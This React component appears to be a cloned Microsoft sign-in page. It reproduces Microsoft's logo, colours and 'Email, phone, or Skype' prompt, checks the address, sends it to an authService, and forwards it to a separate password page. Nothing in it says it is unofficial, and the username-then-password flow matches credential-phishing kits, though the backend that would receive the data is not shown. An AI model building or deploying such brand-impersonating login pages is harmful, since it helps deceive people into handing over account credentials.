import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowRight } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import authService from '../services/authService';

const SignIn = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleNext = async (e) => {
    e.preventDefault();
    setError('');

    if (!email.trim()) {
      setError('Enter a valid email address, phone number, or Skype name.');
      return;
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError('Enter a valid email address, phone number, or Skype name.');
      return;
    }

    setLoading(true);
    try {
      await authService.checkEmail(email);
      // Navigate to password page with email
      navigate('/password', { state: { email } });
    } catch (err) {
      setError('Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-[440px]">
        {/* Microsoft Logo */}
        <div className="mb-8">
          <div className="flex items-center gap-4 mb-8">
            <div className="grid grid-cols-2 gap-1">
              <div className="w-5 h-5 bg-[#F25022]"></div>
              <div className="w-5 h-5 bg-[#7FBA00]"></div>
              <div className="w-5 h-5 bg-[#00A4EF]"></div>
              <div className="w-5 h-5 bg-[#FFB900]"></div>
            </div>
            <span className="text-2xl font-[600] text-[#5E5E5E]">Microsoft</span>
          </div>
        </div>

        {/* Sign in heading */}
        <h1 className="text-[28px] font-[600] text-[#1B1B1B] mb-3 leading-tight">Sign in</h1>

        {/* Form */}
        <form onSubmit={handleNext} className="space-y-4">
          <div className="space-y-2">
            <Input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              className="w-full h-12 px-3 pt-4 pb-2 border-b-2 border-t-0 border-x-0 border-[#8A8886] rounded-none bg-[#F3F2F1] hover:border-[#323130] focus:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0 placeholder:text-[#605E5C] text-[15px] transition-colors"
              disabled={loading}
              autoComplete="username"
            />
            {error && (
              <p className="text-[#E81123] text-[13px] mt-2 flex items-start gap-1">
                <span>⚠</span>
                <span>{error}</span>
              </p>
            )}
          </div>

          <div className="space-y-3 pt-2">
            <p className="text-[13px] text-[#1B1B1B]">
              No account?{' '}
              <button
                type="button"
                onClick={() => navigate('/create-account')}
                className="text-[#0067B8] hover:underline font-[600]"
              >
                Create one!
              </button>
            </p>
            <button
              type="button"
              onClick={() => navigate('/forgot-password')}
              className="text-[#0067B8] hover:underline text-[13px] font-normal block"
            >
              Can't access your account?
            </button>
          </div>

          <div className="pt-6 flex justify-end">
            <Button
              type="submit"
              disabled={loading}
              className="bg-[#0067B8] hover:bg-[#005A9E] text-white px-10 h-8 rounded-sm font-[600] text-[15px] transition-colors disabled:opacity-50"
            >
              {loading ? 'Please wait...' : 'Next'}
            </Button>
          </div>
        </form>

        {/* Sign-in options */}
        <div className="mt-8 pt-6 border-t border-[#EDEBE9]">
          <button
            onClick={() => navigate('/sign-in-options')}
            className="flex items-center gap-3 text-[#1B1B1B] hover:bg-[#F3F2F1] p-3 -ml-3 rounded-sm transition-all w-full group"
          >
            <svg className="w-5 h-5 text-[#605E5C]" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12.65 10A5.99 5.99 0 007 6c-3.31 0-6 2.69-6 6s2.69 6 6 6a5.99 5.99 0 005.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
            </svg>
            <span className="text-[15px] text-[#1B1B1B] group-hover:text-[#0067B8]">Sign-in options</span>
          </button>
        </div>
      </div>
    </div>
  );
};

export default SignIn;